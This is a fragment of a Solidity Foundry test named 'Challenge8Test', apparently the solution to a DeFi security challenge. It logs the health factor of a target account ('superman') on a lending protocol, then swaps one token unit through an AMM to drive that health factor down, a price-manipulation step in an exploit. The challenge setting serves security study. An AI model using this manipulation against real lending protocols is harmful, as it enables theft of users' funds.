...
contract Challenge8Test is Test {
    ...
    function testSolution()public {
        ...
        ////////////////////////////////////////////////////*/
        console.log("superman's health factor before dumping token: ", oiler.healthFactor(superman) / 1e18);
        token.approve(address(amm), 1);
        amm.swap(address(token), 1);
        console.log("superman's health factor after dumping token: ", oiler.healthFactor(superman) / 1e18);
